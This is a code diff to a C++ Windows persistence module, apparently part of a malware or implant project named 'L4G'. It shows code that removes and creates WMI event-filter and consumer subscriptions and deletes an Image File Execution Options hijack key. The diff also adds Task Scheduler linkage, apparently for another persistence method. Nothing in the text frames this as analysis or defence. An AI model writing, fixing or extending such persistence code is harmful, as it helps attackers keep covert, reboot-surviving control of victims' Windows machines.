@@ -1,11 +1,14 @@
 #include "boot_start.hpp"
 #include <windows.h>
+#include <taskschd.h>
 #include <string>
 #include <vector>
+#include <random>
 #include <comdef.h>
 #include <wbemidl.h>
 
 #pragma comment(lib, "wbemuuid.lib")
+#pragma comment(lib, "taskschd.lib")
 
 namespace l4g::persistence {
 
@@ -41,9 +44,9 @@ bool BootStart::uninstall(const std::wstring& service_name) {
     }
     
     // Remove WMI subscription
-    system(("powershell -c \"Remove-WmiObject -Query \\\"SELECT * FROM __EventFilter WHERE Name='L4G_Filter'\\\"\" >nul 2>&1").c_str());
-    system(("powershell -c \"Remove-WmiObject -Query \\\"SELECT * FROM CommandLineEventConsumer WHERE Name='L4G_Consumer'\\\"\" >nul 2>&1").c_str());
-    system(("powershell -c \"Remove-WmiObject -Query \\\"SELECT * FROM __FilterToConsumerBinding WHERE Filter='L4G_Filter'\\\"\" >nul 2>&1").c_str());
+    system("powershell -c \"Remove-WmiObject -Query \\\"SELECT * FROM __EventFilter WHERE Name='L4G_Filter'\\\"\" >nul 2>&1");
+    system("powershell -c \"Remove-WmiObject -Query \\\"SELECT * FROM CommandLineEventConsumer WHERE Name='L4G_Consumer'\\\"\" >nul 2>&1");
+    system("powershell -c \"Remove-WmiObject -Query \\\"SELECT * FROM __FilterToConsumerBinding WHERE Filter='L4G_Filter'\\\"\" >nul 2>&1");
     
     // Remove Image Hijack
     RegDeleteKeyW(HKEY_LOCAL_MACHINE, (L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + service_name).c_str());
@@ -130,7 +133,7 @@ bool BootStart::create_wmi_subscription(const std::wstring& name, const std::wst
     if (FAILED(hr)) { CoUninitialize(); return false; }
     
     IWbemServices* pSvc = nullptr;
-    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), nullptr, nullptr, 0, nullptr, 0, 0, &pSvc);
+    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), nullptr, nullptr, 0, 0L, nullptr, 0, &pSvc);
     if (FAILED(hr)) { pLoc->Release(); CoUninitialize(); return false; }
     
     hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);
